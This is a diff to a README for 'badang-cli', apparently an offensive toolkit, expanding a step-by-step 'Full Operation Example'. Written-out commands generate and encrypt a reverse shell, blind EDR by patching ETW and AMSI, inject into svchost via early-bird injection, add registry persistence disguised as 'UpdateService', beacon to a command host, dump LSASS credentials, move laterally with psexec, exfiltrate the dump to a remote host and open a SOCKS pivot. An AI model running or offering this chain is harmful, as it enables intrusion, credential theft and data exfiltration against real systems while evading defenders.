@@ -366,39 +366,49 @@ Six methods: `registry`, `schtask`, `wmi`, `hijack`, `com`, `service`. All use d
 
 ## Full Operation Example
 
-Putting it all together — a complete evasion chain:
+Putting it all together — a complete chain from payload to post-exploitation:
 
 ```bash
 # 1. Generate and encrypt a reverse shell
 badang-cli generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin
 badang-cli encrypt --payload rev.bin --method rc4 --key "s3cret" -o encrypted.bin
 
-# 2. Blind EDR telemetry
+# 2. Check if environment is safe
+badang-cli loader --check all --action exit -x -c
+
+# 3. Blind EDR telemetry
 badang-cli etw -x -c
 badang-cli amsi -x -c
 
-# 3. Find a target
+# 4. Find a target
 badang-cli scan --filter svchost
 
-# 4. Check what's hooked
+# 5. Check what's hooked
 badang-cli analyze --pid 1234 -x -c
 
-# 5. Choose your approach based on what you found:
+# 6. Choose your approach based on what you found:
 #    - Hooks on NtCreateThreadEx? Use section mapping or early bird
 #    - Hooks on NtWriteVirtualMemory? Use section mapping (no WriteProcessMemory)
 #    - Everything hooked? Use indirect syscalls + early bird
 
-# 6. Inject
+# 7. Inject
 badang-cli inject --technique earlybird --payload encrypted.bin -x -c
-
-# 7. Reverse shell connects back
-#    EDR telemetry is blind (ETW patched)
-#    Process tree looks normal (spawned by PPID-spoofed parent)
-#    Memory encrypted during sleep (sleep obfuscation)
-#    Call stacks show ntdll/kernel32 (stack spoofing)
 
 # 8. Set up persistence
 badang-cli persist --method registry --name "UpdateService" --payload encrypted.bin -x -c
+
+# 9. Start comms beacon
+badang-cli comms --host 10.0.0.1 --comms-key aabbccddee112233 --interval 30000 --jitter 20 -x -c
+
+# 10. Harvest credentials and move laterally
+badang-cli postex --module lsass --pid 672 --postex-output dump.bin -x -c
+badang-cli postex --module psexec --remote 10.0.0.5 --postex-user admin --postex-pass pass --postex-payload svc.exe -x -c
+
+# 11. Exfiltrate data
+badang-cli postex --module exfil --file dump.bin --remote-host 10.0.0.1 --remote-port 8443 --exfil-key s3cret -x -c
+
+# 12. Set up tunneling for pivoting
+badang-cli postex --module socks --listen-port 1080 -x -c
 ```
 
 ---
